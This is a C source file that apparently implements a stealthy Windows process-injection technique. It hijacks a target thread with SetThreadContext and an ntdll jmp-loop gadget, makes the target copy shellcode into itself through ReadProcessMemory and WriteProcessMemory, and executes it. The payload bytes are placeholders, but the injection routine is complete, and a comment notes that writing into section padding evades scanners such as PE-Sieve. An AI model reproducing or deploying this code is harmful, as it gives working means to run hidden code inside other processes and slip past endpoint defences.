#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#include "nina.h"

#pragma comment(lib, "ntdll.lib")

#define JMP_LOOP_OFFSET 0x1CF2B
#define SHELLCODE_PADDING 0x30

//
// Example shellcode:
// Make sure to have 8 reserved bytes for 64-bit
// jmp loop gadget to ROP into to stall execution.
// You will also need 40 reserved bytes for the 
// shadow stack used by ReadProcessMemory and 
// WriteProcessMemory.
//
BYTE Shellcode[] = {
    //
    // 8 bytes for RET gadget.
    //
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    //
    // Shadow stack.
    //
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    //
    // Actual shellcode starts here.
    //
    0xEB, 0xFE, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAA,
    0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

static
BOOL
SetExecutionContext(
    _In_ PHANDLE ThreadHandle,
    _In_opt_ PVOID *Rip,
    _In_opt_ PVOID *Rsp,
    _In_ DWORD64 Arg1,
    _In_ DWORD64 Arg2,
    _In_ DWORD64 Arg3,
    _In_ DWORD64 Arg4,
    _Out_opt_ PCONTEXT OutCtx
)
{
    BOOL Success;
    CONTEXT Ctx;

    if (SuspendThread(*ThreadHandle) == -1) {
        return FALSE;
    }

    ZeroMemory(&Ctx, sizeof(CONTEXT));
    Ctx.ContextFlags = CONTEXT_FULL;
    Success = GetThreadContext(*ThreadHandle, &Ctx);
    if (!Success) {
        return FALSE;
    }

    if (OutCtx) {
        ZeroMemory(OutCtx, sizeof(CONTEXT));
        CopyMemory(OutCtx, &Ctx, sizeof(CONTEXT));
    }

    if (Rip) {
        Ctx.Rip = *(DWORD64*)Rip;
    }

    if (Rsp) {
        Ctx.Rsp = *(DWORD64*)Rsp;
    }

    Ctx.Rcx = Arg1;
    Ctx.Rdx = Arg2;
    Ctx.R8 = Arg3;
    Ctx.R9 = Arg4;

    Success = SetThreadContext(*ThreadHandle, &Ctx);
    if (!Success) {
        return FALSE;
    }

    if (ResumeThread(*ThreadHandle) == -1) {
        return FALSE;
    }

    //
    // Sleep so SetThreadContext can take effect.
    //
    Sleep(100);

    return TRUE;
}

static
BOOL
GetStackOffset(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID Address,
    _In_ SIZE_T AddressSize,
    _Out_ ULONG_PTR *StackOffset
)
{
    BOOL Success;
    ULONG_PTR* Stack = NULL;

    *StackOffset = 0;

    //
    // Allocate a stack to read a local copy.
    //
    Stack = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, AddressSize);
    if (!Stack) {
        return FALSE;
    }
    //
    // Scan stack for NULL fifth arg
    //
    Success = ReadProcessMemory(
        ProcessHandle,
        Address,
        Stack,
        AddressSize,
        NULL
    );
    if (!Success) {
        return FALSE;
    }

    //
    // Enumerate from bottom (it's a stack).
    // Start from -5 * 8 => at least five arguments + shellcode.
    //
    for (SIZE_T i = AddressSize - 5 * sizeof(SIZE_T) - sizeof(Shellcode); i > 0; i -= sizeof(SIZE_T)) {
        ULONG_PTR* StackVal = (ULONG_PTR*)((LPBYTE)Stack + i);
        if (*StackVal == 0) {
            //
            // Get stack offset starting position.
            //
            *StackOffset = i + 5 * sizeof(SIZE_T);
            break;
        }
    }

    HeapFree(GetProcessHeap(), 0, Stack);

    return TRUE;
}

static
BOOL
GetStackLocation(
    _In_ HANDLE ProcessHandle,
    _In_ HANDLE ThreadHandle,
    _Out_ PVOID* StackLocation
)
{
    NTSTATUS Status;
    BOOL Success;
    THREAD_BASIC_INFORMATION ThreadBasicInfo;
    ULONG ReturnLength;
    NT_TIB Tib;
    ULONG_PTR StackOffset;

    *StackLocation = 0;

    Status = NtQueryInformationThread(
        ThreadHandle,
        ThreadBasicInformation,
        &ThreadBasicInfo,
        sizeof(THREAD_BASIC_INFORMATION),
        &ReturnLength
    );
    if (!NT_SUCCESS(Status)) {
        return FALSE;
    }

    Success = ReadProcessMemory(
        ProcessHandle,
        ThreadBasicInfo.TebBaseAddress,
        &Tib,
        sizeof(NT_TIB),
        NULL
    );
    if (!Success) {
        return FALSE;
    }

    Success = GetStackOffset(
        ProcessHandle,
        Tib.StackLimit,
        (ULONG_PTR)Tib.StackBase - (ULONG_PTR)Tib.StackLimit,
        &StackOffset
    );
    if (!Success) {
        return FALSE;
    }

    *StackLocation = (PVOID)((LPBYTE)Tib.StackLimit + StackOffset);

    return TRUE;
}

static
BOOL
GetStackAndShellcodeLocations(
    _In_ HANDLE ProcessHandle,
    _In_ HANDLE ThreadHandle,
    _Out_ PVOID* StackLocation,
    _Out_ PVOID* ShellcodeLocation
)
{
    NTSTATUS Status;
    BOOL Success;
    SIZE_T QuerySize;
    PROCESS_BASIC_INFORMATION ProcessBasicInfo;
    ULONG ReturnLength;
    PEB Peb;
    MEMORY_BASIC_INFORMATION MemoryBasicInfo;
    IMAGE_DOS_HEADER DosHeader;
    IMAGE_NT_HEADERS NtHeaders;
    PVOID ImageBaseAddress = NULL;
    ULONG_PTR StackOffset;

    //
    // Initialise to NULL.
    //
    *StackLocation = NULL;
    *ShellcodeLocation = NULL;

    //
    // Get PEB.
    //
    Status = NtQueryInformationProcess(
        ProcessHandle,
        ProcessBasicInformation,
        &ProcessBasicInfo,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    if (!NT_SUCCESS(Status)) {
        return FALSE;
    }

    //
    // Read base address.
    //
    Success = ReadProcessMemory(
        ProcessHandle,
        ProcessBasicInfo.PebBaseAddress,
        &Peb,
        sizeof(PEB),
        NULL
    );
    if (!Success) {
        return FALSE;
    }

    ImageBaseAddress = Peb.Reserved3[1];

    //
    // Get DOS header.
    //
    Success = ReadProcessMemory(
        ProcessHandle,
        ImageBaseAddress,
        &DosHeader,
        sizeof(IMAGE_DOS_HEADER),
        NULL
    );
    if (!Success) {
        return FALSE;
    }

    //
    // Get NT Headers.
    //
    Success = ReadProcessMemory(
        ProcessHandle,
        (LPBYTE)ImageBaseAddress + DosHeader.e_lfanew,
        &NtHeaders,
        sizeof(IMAGE_NT_HEADERS),
        NULL
    );
    if (!Success) {
        return FALSE;
    }

    //
    // Look for existing memory pages inside the executable image
    // so that we don't corrupt other images.
    //
    for (SIZE_T i = 0; i < NtHeaders.OptionalHeader.SizeOfImage && (!*StackLocation || !*ShellcodeLocation);) {
        QuerySize = VirtualQueryEx(
            ProcessHandle,
            (LPBYTE)ImageBaseAddress + i,   // Base address
            &MemoryBasicInfo,
            sizeof(MEMORY_BASIC_INFORMATION)
        );
        if (!QuerySize) {
            return FALSE;
        }

        //
        // Search for a RW region to act as the stack.
        // Note: It's probably ideal to look for a RW section 
        // inside the executable image memory pages because
        // the padding of sections suits the fifth, optional
        // argument for ReadProcessMemory and WriteProcessMemory.
        //
        if (MemoryBasicInfo.Protect & PAGE_READWRITE) {
            //
            // Stack location in RW page starting at the bottom.
            //
            Success = GetStackOffset(
                ProcessHandle,
                MemoryBasicInfo.BaseAddress,
                MemoryBasicInfo.RegionSize,
                &StackOffset
            );
            if (!Success) {
                return FALSE;
            }

            *StackLocation = (PVOID)((LPBYTE)MemoryBasicInfo.BaseAddress + StackOffset);
        } else if (MemoryBasicInfo.Protect == PAGE_EXECUTE_READ && MemoryBasicInfo.RegionSize >= (sizeof(Shellcode) - SHELLCODE_PADDING)) {
            //
            // Look from the bottom for potential padding.
            // Infecting padding will bypass tools like PE-Sieve.
            //
            *ShellcodeLocation = (PVOID)((LPBYTE)MemoryBasicInfo.BaseAddress + MemoryBasicInfo.RegionSize - sizeof(Shellcode) + SHELLCODE_PADDING);
        }

        i += MemoryBasicInfo.RegionSize;
    }

    if (!*StackLocation) {
        //
        // Fallback to find the actual stack location.
        //
        GetStackLocation(ProcessHandle, ThreadHandle, StackLocation);
    }

    return TRUE;
}

static
BOOL
InjectData(
    _In_ PHANDLE ProcessHandle,
    _In_ PHANDLE ThreadHandle,
    _In_ HANDLE TargetProcessHandle,
    _In_ PVOID *StackLocation,
    _In_ PVOID DataStoreAddress,
    _In_ PVOID DataWriteAddress,
    _In_ LPBYTE Data,
    _In_ SIZE_T ReadSize,
    _In_ SIZE_T WriteSize
)
{
    BOOL Success;
    PVOID Kernel32;
    PVOID _ReadProcessMemory = NULL;
    PVOID _WriteProcessMemory = NULL;

    Kernel32 = GetModuleHandle(L"kernel32.dll");
    if (!Kernel32) {
        return FALSE;
    }

    _ReadProcessMemory = GetProcAddress(Kernel32, "ReadProcessMemory");
    if (!_ReadProcessMemory) {
        return FALSE;
    }

    _WriteProcessMemory = GetProcAddress(Kernel32, "WriteProcessMemory");
    if (!_WriteProcessMemory) {
        return FALSE;
    }

    //
    // Get target process to read our data.
    //
    Success = SetExecutionContext(
        ThreadHandle,
        &_ReadProcessMemory,
        StackLocation,
        // RCX: Duplicated handle to our own process' data.
        (DWORD64)TargetProcessHandle,
        // RDX: Address to read data.
        (DWORD64)Data,
        // R8: Buffer to store data.
        (DWORD64)DataStoreAddress,
        // R9: Size to read
        ReadSize,
        NULL
    );
    if (!Success) {
        return FALSE;
    }

    //
    // Get target process to write data.
    //
    Success = SetExecutionContext(
        ThreadHandle,
        &_WriteProcessMemory,
        StackLocation,
        // RCX: Self handle to write to self.
        (DWORD64)((HANDLE)-1),
        // RDX: Buffer to store data.
        (DWORD64)DataWriteAddress,
        // R8: Address to read data.
        (DWORD64)((LPBYTE)*StackLocation + 0x30),
        // R9: Size to write
        WriteSize,
        NULL
    );
    if (!Success) {
        return FALSE;
    }

    return TRUE;
}

BOOL
InjectPayload(
    _In_ HANDLE ProcessHandle,
    _In_ HANDLE ThreadHandle,
    _In_ BOOL RestoreExecution
)
{
    BOOL Success;
    CONTEXT OriginalCtx;
    HANDLE DupeProcessHandle;
    PVOID JmpGadget = NULL;
    PVOID StackLocation, ShellcodeLocation;
    PVOID _ReadProcessMemory = NULL;
    PVOID _WriteProcessMemory = NULL;
    LPBYTE OriginalShellcode = NULL;

    //
    // jmp loop (jmp -2) gadget to stall.
    // WARNING: This will change on different ntdll versions.
    //
    JmpGadget = (PVOID)((LPBYTE)GetModuleHandle(L"ntdll.dll") + JMP_LOOP_OFFSET);
    //
    // Set the first 8 bytes of the shellcode to the jmp loop
    // as per spec.
    //
    *(PVOID*)Shellcode = JmpGadget;

    //
    // Set execution to the jmp loop so that we can allow 
    // the volatile registers to remain consistent using
    // SetThreadContext.
    //
    Success = SetExecutionContext(
        &ThreadHandle,
        &JmpGadget,
        NULL,
        0,
        0,
        0,
        0,
        &OriginalCtx
    );
    if (!Success) {
        return FALSE;
    }

    Success = GetStackAndShellcodeLocations(
        ProcessHandle,
        ThreadHandle,
        &StackLocation,
        &ShellcodeLocation
    );
    if (!Success) {
        return FALSE;
    }

	if (RestoreExecution) {
        //
        // Optional recovery of overwritten data.
        //
        OriginalShellcode = HeapAlloc(
            GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            sizeof(Shellcode) - SHELLCODE_PADDING
        );
        if (OriginalShellcode) {
            ReadProcessMemory(
                ProcessHandle,
                ShellcodeLocation,
                OriginalShellcode,
                sizeof(Shellcode) - SHELLCODE_PADDING,
                NULL
            );
        }
	}

    //
    // Dupe self proc handle so target process can read us.
    //
    Success = DuplicateHandle(
        GetCurrentProcess(),
        GetCurrentProcess(),
        ProcessHandle,
        &DupeProcessHandle,
        0,
        FALSE,
        DUPLICATE_SAME_ACCESS
    );
    if (!Success) {
        return FALSE;
    }

    InjectData(
        &ProcessHandle,
        &ThreadHandle,
        DupeProcessHandle,
        &StackLocation,
        StackLocation,
        ShellcodeLocation,
        Shellcode,
        sizeof(Shellcode),
        sizeof(Shellcode) - SHELLCODE_PADDING
    );

    //
    // Execute shellcode.
    //
    Success = SetExecutionContext(
        &ThreadHandle,
        // Set RIP to execute shellcode
        &ShellcodeLocation,
        NULL,
        // Arguments to shellcode are optional.
        0,
        0,
        0,
        0,
        NULL
    );
    if (!Success) {
        return FALSE;
    }

	if (RestoreExecution) {
        //
        // Wait for execution to complete.
        //
        Sleep(10000);

        //
        // Restore original overwritten data and 
        // recover execution.
        //
        if (OriginalShellcode) {
            InjectData(
                &ProcessHandle,
                &ThreadHandle,
                DupeProcessHandle,
                &StackLocation,
                (LPBYTE)StackLocation + 0x30,
                ShellcodeLocation,
                OriginalShellcode,
                sizeof(Shellcode) - SHELLCODE_PADDING,
                sizeof(Shellcode) - SHELLCODE_PADDING
            );

            HeapFree(GetProcessHeap(), 0, OriginalShellcode);
        }

        if (SuspendThread(ThreadHandle) != -1) {
            SetThreadContext(ThreadHandle, &OriginalCtx);
            ResumeThread(ThreadHandle);
        }
	}

    return TRUE;
}